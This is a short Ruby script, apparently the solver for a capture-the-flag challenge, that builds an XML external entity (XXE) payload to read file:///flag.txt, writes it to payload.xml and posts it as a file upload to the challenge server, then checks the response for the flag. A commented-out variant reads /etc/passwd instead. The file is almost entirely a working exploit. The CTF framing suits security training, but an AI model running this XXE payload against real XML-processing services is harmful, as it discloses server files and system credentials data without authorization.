require 'httparty'
require 'tempfile'
require_relative 'libronsolve'

XXE = <<~XXE
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///flag.txt">
  ]>
  <dragons>
    <dragon>
      <name>Smaug</name>
      <proof>&xxe;</proof>
    </dragon>
  </dragons>
XXE

# XXE = <<~XXE
#   <!DOCTYPE draconis [
#     <!ENTITY xxe SYSTEM "file:///etc/passwd">
#   ]>
#   <dragons>
#     <dragon>
#       <name>Smaug</name>
#       <proof>&xxe;</proof>
#     </dragon>
#   </dragons>
# XXE

EXPLOIT_FILE = File.join(__dir__, 'payload.xml')
File.write(EXPLOIT_FILE, XXE)

result = HTTParty.post(
  get_url(),
  body: {
    dragon_file: File.open(EXPLOIT_FILE, 'r')
  },
  headers: {
    'Content-Type' => 'multipart/form-data'
  }
)

if result.success?
  check_flag(result.parsed_response, terminate: true, partial: true)
else
  puts "Something went wrong: #{ result.parsed_response }"
  exit(1)
end
